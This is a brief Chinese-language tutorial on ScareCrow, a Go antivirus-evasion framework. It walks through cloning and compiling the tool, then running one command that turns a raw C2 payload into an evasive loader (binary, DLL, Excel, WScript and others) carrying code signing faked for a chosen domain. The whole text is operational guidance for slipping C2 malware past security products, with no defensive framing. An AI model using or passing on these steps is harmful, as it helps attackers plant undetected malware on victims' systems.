ScareCrow是一款Go语言编写的一个免杀框架，地址为：https://github.com/optiv/ScareCrow



安装：

首先down下来该工具


git clone https://github.com/optiv/ScareCrow.git


然后编译即可


go build ScareCrow.go


若编译过程中出现超时问题，可尝试使用下面的命令解决：


go env -w GO111MODULE=ongo env -w GOPROXY=https://goproxy.cn,direct


编译之后运行截图如下：



简单使用


首先使用各类Ｃ2工具生成raw的文件



然后使用下面的命令来进行生成我们的载荷：


ScareCrow -I /root/payload.bin -Loader binary -domain www.acme.com


-Loader：指定输出的类型，目前支持binary、control、dll、excel 、 wscript

-domain：指定一个域名进行代码签名
